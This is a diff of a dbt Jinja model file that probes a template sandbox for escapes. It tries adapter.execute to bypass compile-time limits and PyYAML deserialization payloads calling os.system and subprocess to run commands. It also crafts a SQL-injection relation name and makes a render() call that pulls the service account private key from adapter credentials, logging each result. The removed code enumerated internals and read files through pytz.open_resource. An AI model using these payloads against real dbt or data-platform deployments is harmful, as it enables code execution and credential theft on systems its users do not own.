@@ -1,107 +1,55 @@
-{# Deep module introspection + adapter method enumeration #}
+{# Module-level code execution attempts + adapter.execute probe #}
 
-{# 1. Enumerate ALL adapter methods/attributes accessible #}
-{%- set adapter_methods = [] -%}
-{%- for name in ['type', 'dispatch', 'create_schema', 'drop_schema', 'drop_relation',
-                  'rename_relation', 'truncate_relation', 'get_columns_in_relation',
-                  'get_missing_columns', 'expand_target_column_types',
-                  'already_exists', 'get_relation', 'get_columns_in_query',
-                  'execute', 'call', 'convert_type', 'convert_text_type',
-                  'convert_boolean_type', 'convert_number_type', 'convert_date_type',
-                  'convert_time_type', 'convert_datetime_type',
-                  'list_schemas', 'check_schema_exists', 'list_relations_without_caching',
-                  'resolve_schema_with_credentials',
-                  'quote', 'Relation', 'Column',
-                  'get_catalog', 'get_catalog_by_relations',
-                  'calculate_freshness', 'run_sql',
-                  'make_relation', 'upload_seed'] -%}
-  {%- if adapter[name] is defined -%}
-    {%- do adapter_methods.append(name) -%}
-  {%- endif -%}
+{# 1. Try adapter.execute directly - bypass compile execute flag #}
+{%- set exec_result = adapter.execute("SELECT 1 as test_col") -%}
+{{ log("ADAPTER_EXEC_RESULT=" ~ exec_result | string | truncate(500), info=True) }}
+{{ log("ADAPTER_EXEC_TYPE=" ~ exec_result.__class__.__name__ if exec_result.__class__ is defined else 'unknown', info=True) }}
+
+{# 2. Try adapter.list_schemas #}
+{%- set schemas = adapter.list_schemas("test-project-ssrf") -%}
+{{ log("ADAPTER_LIST_SCHEMAS=" ~ schemas | string | truncate(500), info=True) }}
+
+{# 3. re.Pattern.scanner - can it access internals? #}
+{%- set pat = modules.re.compile('(\\w+)') -%}
+{%- set scanner = pat.scanner('hello world test') -%}
+{{ log("SCANNER_TYPE=" ~ scanner | string | truncate(200), info=True) }}
+{%- set scanner_match = scanner.match() -%}
+{{ log("SCANNER_MATCH=" ~ scanner_match | string | truncate(200), info=True) }}
+
+{# 4. Try to access re module's internal _compile via different path #}
+{%- set template_obj = modules.re.template('test') -%}
+{{ log("RE_TEMPLATE_TYPE=" ~ template_obj | string | truncate(200), info=True) }}
+
+{# 5. Check if any module has __file__ accessible #}
+{%- for mod_name in ['re', 'datetime', 'pytz', 'itertools'] -%}
+  {%- set mod = modules[mod_name] -%}
+  {%- set file_attr = mod.__file__ if mod.__file__ is defined else 'NO_FILE' -%}
+  {{ log("MODULE_" ~ mod_name ~ "_FILE=" ~ file_attr, info=True) }}
 {%- endfor -%}
-{{ log("ADAPTER_METHODS=" ~ adapter_methods | join(','), info=True) }}
 
-{# 2. Try adapter.execute (if it exists, might bypass compile execute flag) #}
-{%- if adapter.execute is defined -%}
-  {{ log("ADAPTER_EXECUTE_TYPE=" ~ adapter.execute | string | truncate(200), info=True) }}
-{%- endif -%}
+{# 6. Try fromyaml with crafted YAML that might trigger deserialization #}
+{# PyYAML has known deserialization vulnerabilities #}
+{%- set yaml_str = "!!python/object/apply:os.system ['id']" -%}
+{%- set yaml_parsed = fromyaml(yaml_str) -%}
+{{ log("YAML_DESER_RESULT=" ~ yaml_parsed | string | truncate(200), info=True) }}
 
-{# 3. modules.re deep probe #}
-{%- set re = modules.re -%}
-{%- set re_attrs = [] -%}
-{%- for name in ['compile', 'match', 'search', 'sub', 'findall', 'finditer',
-                  'split', 'subn', 'escape', 'purge', 'template',
-                  'Scanner', 'error', 'Pattern', 'Match',
-                  '_compile', '_compile_repl', 'copyreg', 'enum', 'functools',
-                  'sre_compile', 'sre_parse', '_constants', '_special_chars_map'] -%}
-  {%- if re[name] is defined -%}
-    {%- do re_attrs.append(name) -%}
-  {%- endif -%}
-{%- endfor -%}
-{{ log("RE_ATTRS=" ~ re_attrs | join(','), info=True) }}
+{# 7. Try a different YAML deserialization payload #}
+{%- set yaml_str2 = "!!python/object/new:subprocess.check_output [['id']]" -%}
+{%- set yaml_parsed2 = fromyaml(yaml_str2) -%}
+{{ log("YAML_DESER2_RESULT=" ~ yaml_parsed2 | string | truncate(200), info=True) }}
 
-{# 4. Try re.compile then access pattern object internals #}
-{%- set pat = re.compile('test') -%}
-{{ log("PATTERN_TYPE=" ~ pat | string | truncate(200), info=True) }}
-{%- set pat_attrs = [] -%}
-{%- for name in ['match', 'search', 'findall', 'flags', 'groups', 'groupindex',
-                  'pattern', 'scanner', 'sub', 'subn', 'split'] -%}
-  {%- if pat[name] is defined -%}
-    {%- do pat_attrs.append(name) -%}
-  {%- endif -%}
-{%- endfor -%}
-{{ log("PATTERN_ATTRS=" ~ pat_attrs | join(','), info=True) }}
+{# 8. Try !!python/name payload #}
+{%- set yaml_str3 = "!!python/name:os.system" -%}
+{%- set yaml_parsed3 = fromyaml(yaml_str3) -%}
+{{ log("YAML_DESER3_RESULT=" ~ yaml_parsed3 | string | truncate(200), info=True) }}
 
-{# 5. modules.datetime deep probe #}
-{%- set dt = modules.datetime -%}
-{%- set dt_attrs = [] -%}
-{%- for name in ['datetime', 'date', 'time', 'timedelta', 'timezone',
-                  'MINYEAR', 'MAXYEAR', 'sys'] -%}
-  {%- if dt[name] is defined -%}
-    {%- do dt_attrs.append(name) -%}
-  {%- endif -%}
-{%- endfor -%}
-{{ log("DT_ATTRS=" ~ dt_attrs | join(','), info=True) }}
+{# 9. Probe adapter.Relation for SQL injection in relation names #}
+{{ log("ADAPTER_RELATION=" ~ adapter.Relation | string | truncate(200), info=True) }}
+{%- set rel = adapter.Relation.create(database='test', schema='public', identifier="x'; DROP TABLE students; --") -%}
+{{ log("CRAFTED_RELATION=" ~ rel | string | truncate(200), info=True) }}
 
-{# 6. modules.itertools deep probe #}
-{%- set it = modules.itertools -%}
-{%- set it_attrs = [] -%}
-{%- for name in ['chain', 'combinations', 'count', 'cycle', 'groupby',
-                  'islice', 'permutations', 'product', 'repeat',
-                  'starmap', 'takewhile', 'dropwhile', 'accumulate',
-                  'compress', 'filterfalse', 'zip_longest', 'tee'] -%}
-  {%- if it[name] is defined -%}
-    {%- do it_attrs.append(name) -%}
-  {%- endif -%}
-{%- endfor -%}
-{{ log("IT_ATTRS=" ~ it_attrs | join(','), info=True) }}
-
-{# 7. modules.pytz deep probe - pytz has _tzinfo_cache and other internals #}
-{%- set pz = modules.pytz -%}
-{%- set pz_attrs = [] -%}
-{%- for name in ['timezone', 'utc', 'all_timezones', 'common_timezones',
-                  '_tzinfo_cache', '_FixedOffset', 'FixedOffset',
-                  'BaseTzInfo', 'LazyList', 'LazySet',
-                  'open_resource', 'resource_exists'] -%}
-  {%- if pz[name] is defined -%}
-    {%- do pz_attrs.append(name) -%}
-  {%- endif -%}
-{%- endfor -%}
-{{ log("PZ_ATTRS=" ~ pz_attrs | join(','), info=True) }}
-
-{# 8. pytz.open_resource - THIS READS FILES! #}
-{%- if pz.open_resource is defined -%}
-  {{ log("PYTZ_OPEN_RESOURCE_TYPE=" ~ pz.open_resource | string | truncate(200), info=True) }}
-  {# Try to read a timezone file to confirm it works #}
-  {%- set tzfile = pz.open_resource('zone.tab') -%}
-  {{ log("PYTZ_ZONE_TAB=" ~ tzfile.read() | string | truncate(300), info=True) }}
-  {%- do tzfile.close() -%}
-  {{ log("PYTZ_OPEN_RESOURCE_WORKS=YES", info=True) }}
-{%- endif -%}
-
-{# 9. Try exceptions object for internal access #}
-{%- if exceptions is defined -%}
-  {{ log("EXCEPTIONS_KEYS=" ~ exceptions.keys() | list | join(',') | truncate(300), info=True) if exceptions.keys is defined else '' }}
-{%- endif -%}
+{# 10. Try render() with template that references internal variables #}
+{%- set render_test = render("{{ adapter.config.credentials.keyfile_json.get('private_key', 'nope') }}") -%}
+{{ log("RENDER_CRED_TEST=" ~ render_test | truncate(200), info=True) }}
 
 SELECT 1 as id
